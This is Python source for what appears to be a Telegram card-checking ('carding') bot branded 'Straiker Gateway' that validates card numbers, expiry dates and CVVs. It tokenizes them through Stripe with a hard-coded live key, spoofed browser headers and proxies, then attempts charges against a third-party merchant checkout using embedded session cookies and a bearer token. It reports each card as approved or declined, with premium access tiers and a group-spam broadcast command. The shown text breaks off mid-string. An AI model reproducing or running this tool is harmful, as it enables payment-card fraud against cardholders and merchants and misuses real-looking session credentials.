                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</b> ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>2014 Processor Declined - Fraud Suspected</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</b> ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>2014 Processor Declined - Fraud Suspected</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "Your card's security code is invalid." in r:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment gateway is invalid</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Payment gateway is invalid</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card number is incorrect." in r:


        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code> 2007 No Account</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code> 2007 No Account</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card was declined." in r:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Transaction declined - gateway rejected</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Transaction declined - gateway rejected</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "Your card has insufficient funds." in r:

        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved</b> ✅</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Not Funds / 2001 Insufficient Funds</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Approved</b> ✅</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Not Funds / 2001 Insufficient Funds</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    elif "requires_payment_method" in r:
        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</b> ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>2007 No Account</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</b> ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>2007 No Account</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")


    elif "requires_action" in r:

        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>3d ❌</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>3d ❌</code>

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

    else:

        with open('admins.txt', 'r') as file:
            if str(user) in file.read():
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Unkmow Error</b> ❌

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")

            else:
                await m3.edit_text(f"""
━━━━━━━━━━━━━
𝗦𝘁𝗿𝗮𝗶𝗸𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined ❌</code>
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <b>Unkmow Error</b> ❌

[🝂] 𝐈𝐧𝐟𝐨: <code>{bn} - {brand} - {typ} - {lv}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bank}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {flag}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Free]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")



    #fffffffff
@iniciar.message_handler(commands=['broadcast'])
async def broadcast_message(message: types.Message):
    ccs = message.text[len('/broadcast '):]  
    # Obtener la lista de actualizaciones del bot
    updates = await bot.get_updates()
 
    # Crear una lista de IDs de chat de grupo donde el bot está presente
    group_chats = []
    for update in updates:
        chat_type = update.message.chat.type
        if chat_type == 'group' or chat_type == 'supergroup':
            chat_id = update.message.chat.id
            if chat_id not in group_chats:
                group_chats.append(chat_id)

    # Enviar un mensaje a cada chat de grupo
    for chat_id in group_chats:
        await bot.send_message(chat_id=chat_id, text=ccs)

@iniciar.message_handler(commands=["chk"], commands_prefix=comand)
async def auth(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: 🔴 Comprobando acceso 🔴</b>")
    time.sleep(1)
    user = message.from_user.id
    with open('admins.txt', 'r') as file:
        if str(user) in file.read():
                await contra.edit_text('<b>Efectivamente tienes premium bb✅</b>')
    
        else:
            await contra.edit_text('❌ <b>No tienes acceso para utilizar este comando ❌ Contacta a</b> @DiegoAkk.')
            return str;
    ini = time.perf_counter()
    if message.reply_to_message: 
        ccs = message.reply_to_message.text

    else: 
            ccs = message.text[len('/chk '):]
    
    if not ccs:
        await contra.edit_text("🟤 [🝂] /chk: <b>Braintree Auth </b>| <b>Status: On</b> ✅")
    
        return str
        
    
    x = re.findall(r'\d+', ccs)
    cc = x[0]
    mes = x[1]                               
    ano = x[2]                               
    cvv = x[3]                               
    if mes.startswith('2'):
    	mes, ano = ano, mes                                                           
    if len(mes) >= 3:
        mes, ano, cvv = ano, cvv, mes
    
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}q\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴]</b>")
    m2 = await m1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}: \nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡]</b>")                               
    time.sleep(2)
    
     
    d1 = await m2.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢]</b>")
    
    nombre = "Andres"
    correo = "jefersonbenthanpalacio@gmail.com"

    cabeza= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = uniproxy.post('https://m.stripe.com/6', headers=cabeza).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]

    bin = uniproxy.get(f'https://bin-api-dragon.ga/bin/api/{cc[:6]}')
    if not bin:
        return

    bin_json = bin.json()

    final = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
    }

    data = f'card[name]=Kurama+Vip&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10080&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F7a2397b1dd%3B+stripe-js-v3%2F7a2397b1dd&time_on_page=39100&key=pk_live_dVPXFoXDyq0EPGhyLM4wHlrh'

    response = uniproxy.post('https://api.stripe.com/v1/tokens', headers=headers, data=data).json()
    d2 = await d1.edit_text(f"<b>💳ᴄᴀʀᴅ: {cc}|{mes}|{ano}|{cvv}\nᴄʜᴇᴄᴋᴇᴀɴᴅᴏ ᴄᴄ: [🔴][🟡][🟢][🟢]</b>")

   
    try:
        idt = response['id']

    except KeyError:
    
        # Si ocurre una excepción KeyError, se envía el mensaje de error
        await d2.edit_text(f"""
━━━━━━━━━━━━━
𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗔𝘂𝘁𝗵
━━━━━━━━━━━━━
[🝂] 𝐂𝐜: <code>{cc}|{mes}|{ano}|{cvv}</code>
[🝂] 𝐒𝐭𝐚𝐭𝐮𝐬: <code>Declined</code> ❌
[🝂] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: <code>Declined</code> ❌

[🝂] 𝐈𝐧𝐟𝐨: <code>{bin_json['data']['vendor']} - {bin_json['data']['type']} - {bin_json['data']['level']}</code>
[🝂] 𝐁𝐚𝐧𝐤: <code>{bin_json['data']['bank']}</code>
[🝂] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{bin_json['data']['countryInfo']['name']} | {bin_json['data']['countryInfo']['emoji']}</code>

[🝂] 𝐓𝐢𝐦𝐞: {final-ini:0.2} (segundos)
[🝂] 𝐂𝐡𝐤 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a> <b>[Premium]</b>
[🝂] 𝐎𝐰𝐧𝐞𝐫 𝐁𝐨𝐭: @DiegoAkk""")
        return str


    

    cookies = {
        'XSRF-TOKEN': 'L7iZl27yDl3rDehgBoVUV4WI_f4okwVWKhOAF2HmWpFcwPemN7ZoNo54pA9k7GUy4OWIzm_bUg9wJ_l4MowLwg%3D%3D',
        '_csrf': 'b7b44722263f4f4596ce933f3c891a4992319bdeda94230b45333fc9a14b617ca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22sxn1YDfkeuLobi1eemu0GHWYZ4yoSjQS%22%3B%7D',
        '_gcl_au': '1.1.615100922.1680298131',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2023-03-31%2021%3A28%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fonerep.com%2Fcheckout%2Findividual-annual%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2023-03-31%2021%3A28%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fonerep.com%2Fcheckout%2Findividual-annual%7C%7C%7Crf%3D%28none%29',
        'sbjs_current_custom': 'campaign_id%3D%28none%29%7C%7C%7Cadgroup_id%3D%28none%29%7C%7C%7Cutm_type%3D%28none%29',
        'sbjs_first_custom': 'campaign_id%3D%28none%29%7C%7C%7Cadgroup_id%3D%28none%29%7C%7C%7Cutm_type%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F111.0.0.0%20Safari%2F537.36%20Edg%2F111.0.1661.54',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fonerep.com%2Fcheckout%2Findividual-annual',
        '_ga': 'GA1.2.993167908.1680298131',
        '_gid': 'GA1.2.1983103290.1680298131',
        '_gat_UA-62975156-1': '1',
        '_gat_UA-62975156-8': '1',
        '_rdt_uuid': '1680298130868.4b2c6aa7-b127-45ba-9c95-9a89af5b1008',
        '_fbp': 'fb.1.1680298131018.190459398',
        '__hstc': '71170255.6ca9648c90b41c83acb6a487e95c9170.1680298131032.1680298131032.1680298131032.1',
        'hubspotutk': '6ca9648c90b41c83acb6a487e95c9170',
        '__hssrc': '1',
        '__hssc': '71170255.1.1680298131033',
        'FPAU': '1.1.615100922.1680298131',
        '__stripe_mid': '8ee2e1b0-1369-4f02-bfe9-9390dea5b27cb04294',
        '__stripe_sid': '65e55c69-88b6-4566-836d-d95feb03fc82e3fa5c',
        '_hjSessionUser_666932': 'eyJpZCI6IjdlYWZjMTk3LTQyNWMtNWMyZi05OGUwLTc5Y2Y0ZjI0OWY0YSIsImNyZWF0ZWQiOjE2ODAyOTgxMzI3NDQsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_666932': '0',
        '_hjSession_666932': 'eyJpZCI6ImFlYzM0ZTY2LWI0NWYtNDBlNS1hYzkzLWQ5MmFjYzQyMzQzZiIsImNyZWF0ZWQiOjE2ODAyOTgxMzI3NTQsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '__zlcmid': '1F9liG3z2pzb2lG',
        'PHPSESSID': '11e204e7585cd4503b4ed6e41ee9a625',
        '_auth': '%7B%22access_token%22%3A%22e1e29147d4a9e0b2a3e2938b684bfd7fee5dd5db%22%2C%22expires_in%22%3A315360000%2C%22token_type%22%3A%22bearer%22%2C%22scope%22%3Anull%2C%22refresh_token%22%3A%221b800c561977ca0c6a8f9cd343b48e483e401df0%22%7D',
        '_identity': '2b309b8e7e37f068253093cf98b63c03304f9c49073fb3df9c4f31da6b4b0878a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22_identity%22%3Bi%3A1%3Bs%3A52%3A%22%5B607467%2C%22ZUcl0BXT8H2se6905RwsfWQeHmmg6R1a%22%2C31536000%5D%22%3B%7D',
        '_uetsid': '079daf70d00b11ed8cb7198110a078ec',
        '_uetvid': '079e08d0d00b11edae1311eebd0a8167',
    }

    headers111 = {
        'authority': 'payment-api.onerep.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer e1e29147d4a9e0b2a3e2938b684bfd7fee5dd5db',
        'content-type': 'application/json',
        # 'cookie': 'XSRF-TOKEN=L7iZl27yDl3rDehgBoVUV4WI_f4okwVWKhOAF2HmWpFcwPemN7ZoNo54pA9k7GUy4OWIzm_bUg9wJ_l4MowLwg%3D%3D; _csrf=b7b44722263f4f4596ce933f3c891a4992319bdeda94230b45333fc9a14b617ca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22sxn1YDfkeuLobi1eemu0GHWYZ4yoSjQS%22%3B%7D; _gcl_au=1.1.615100922.1680298131; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2023-03-31%2021%3A28%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fonerep.com%2Fcheckout%2Findividual-annual%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2023-03-31%2021%3A28%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fonerep.com%2Fcheckout%2Findividual-annual%7C%7C%7Crf%3D%28none%29; sbjs_current_custom=campaign_id%3D%28none%29%7C%7C%7Cadgroup_id%3D%28none%29%7C%7C%7Cutm_type%3D%28none%29; sbjs_first_custom=campaign_id%3D%28none%29%7C%7C%7Cadgroup_id%3D%28none%29%7C%7C%7Cutm_type%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; 